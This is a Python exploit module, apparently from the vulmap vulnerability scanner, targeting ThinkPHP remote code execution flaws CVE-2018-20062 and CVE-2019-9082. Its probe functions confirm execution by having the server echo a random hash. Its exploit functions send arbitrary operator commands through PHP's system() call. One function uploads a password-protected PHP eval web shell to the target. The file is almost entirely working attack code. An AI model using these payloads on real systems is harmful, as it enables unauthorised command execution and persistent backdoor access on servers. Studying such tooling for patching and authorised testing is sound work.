#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
from module import globals
from core.verify import verify
from thirdparty import requests
from core.verify import misinformation
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump


class ThinkPHP():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.payload_cve_2018_20062 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=RECOMMAND"
        self.payload_cve_2019_9082 = ("/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&"
                                      "vars[0]=system&vars[1][]=RECOMMAND")
        self.payload_cve_2019_9082_webshell = ("/index.php/?s=/index/\\think\\app/invokefunction&function="
                                               "call_user_func_array&vars[0]=file_put_contents&vars[1][]=FILENAME&vars[1][]=<?php%20eval"
                                               "(@$_POST[%27SHELLPASS%27]);?>")

    def cve_2018_20062_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "ThinkPHP: CVE-2018-20062"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2018_20062.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "ThinkPHP5 5.0.23 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2018-20062"
        self.vul_info["vul_apps"] = "ThinkPHP"
        self.vul_info["vul_date"] = "2018-12-11"
        self.vul_info["vul_vers"] = "<= 5.0.23, 5.1.31"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，" \
                                    "导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_cve_2018_20062.replace("RECOMMAND", cmd)
        self.path = "/index.php?s=captcha"
        self.method = "post"
        self.rawdata = "null"
        try:
            request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, timeout=self.timeout,
                                         verify=False)
            if md in misinformation(request.text, md):
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2019_9082_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "ThinkPHP: CVE-2019-9082"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2019_9082.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "ThinkPHP5 5.0.23 远程代码执行漏洞"
        self.vul_info["vul_numb"] = "CVE-2019-9082"
        self.vul_info["vul_apps"] = "ThinkPHP"
        self.vul_info["vul_date"] = "2018-12-11"
        self.vul_info["vul_vers"] = "< 3.2.4"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "ThinkPHP prior to 3.2.4, as used in Open Source BMS v1.1.1 and other products, " \
                                    "allows Remote Command Execution via public//?s=index/\think\app/invokefunction" \
                                    "&function=call_user_func_array&vars[0]=system&vars[1][]= followed by the command."
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        self.pocname = "ThinkPHP: "
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_cve_2019_9082.replace("RECOMMAND", cmd)
        self.method = "get"
        self.rawdata = "null"
        try:
            request = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["vul_payd"] = self.payload
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2018_20062_exp(self, cmd):
        vul_name = "ThinkPHP: CVE-2018-20062"
        self.payload = self.payload_cve_2018_20062.replace("RECOMMAND", cmd)
        self.path = "/index.php?s=captcha"
        self.method = "post"
        self.rawdata = "null"
        try:
            request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
                                    timeout=self.timeout,
                                    verify=False)
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2019_9082_exp(self, cmd):
        vul_name = "ThinkPHP: CVE-2019-9082"
        self.payload = self.payload_cve_2019_9082.replace("RECOMMAND", cmd)
        try:
            request = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout,
                                        verify=False)
            r = request.text
            if cmd == "upload":
                self.filename = input("[+] WebShell Name (vulmap.php): ")
                self.shellpass = input("[+] WebShell Password (123456): ")
                self.payload = self.payload_cve_2019_9082_webshell.replace("FILENAME", self.filename).replace(
                    "SHELLPASS", self.shellpass)
                request = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
                r = "WebShell: " + self.url + "/" + self.filename
            raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(r, raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

